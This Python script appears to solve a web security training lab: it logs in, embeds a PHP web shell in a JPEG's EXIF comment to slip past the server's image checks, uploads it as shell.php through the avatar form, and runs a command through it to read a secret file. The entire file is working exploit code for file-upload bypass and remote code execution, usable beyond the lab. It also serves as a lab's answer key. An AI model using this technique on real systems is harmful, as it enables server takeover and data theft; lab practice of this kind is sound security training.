import sys
import os
import subprocess
import shutil
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

lab.login("wiener", "peter")

page = lab.get("/my-account")
soup = BeautifulSoup(page.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

# create a polyglot file: valid JPEG with PHP in the EXIF comment
# server inspects file content (magic bytes / dimensions) so a raw php file gets rejected
# but a real JPEG with php embedded in metadata passes inspection and still executes

# create a minimal JPEG, inject PHP via exiftool, rename to .php
tmp_dir = os.path.join(os.path.dirname(__file__), "tmp")
os.makedirs(tmp_dir, exist_ok=True)
tmp_jpg = os.path.join(tmp_dir, "img.jpg")

# 1x1 white JPEG using imagemagick
subprocess.run(["convert", "-size", "1x1", "xc:white", tmp_jpg],
               check=True, capture_output=True)

# inject php into the comment field
subprocess.run(["exiftool", "-Comment=<?php system($_GET['cmd']); ?>", tmp_jpg],
               check=True, capture_output=True)

with open(tmp_jpg, "rb") as f:
    polyglot = f.read()

# clean up temp files
shutil.rmtree(tmp_dir)

lab.info("Uploading polyglot JPEG/PHP shell...")
resp = lab.post("/my-account/avatar", files={
    "avatar": ("shell.php", polyglot, "image/jpeg")
}, data={
    "user": "wiener",
    "csrf": csrf
})
lab.info(f"Upload status: {resp.status_code}")

secret_resp = lab.get("/files/avatars/shell.php?cmd=cat+/home/carlos/secret")
# response contains JPEG binary junk + the command output
# extract just the secret by finding readable text after the php execution
output = secret_resp.text
for line in output.split("\n"):
    line = line.strip()
    if line and all(c.isalnum() for c in line):
        secret = line
        break

lab.success(f"Secret: {secret}")

lab.post("/submitSolution", data={"answer": secret})
lab.check_solved()
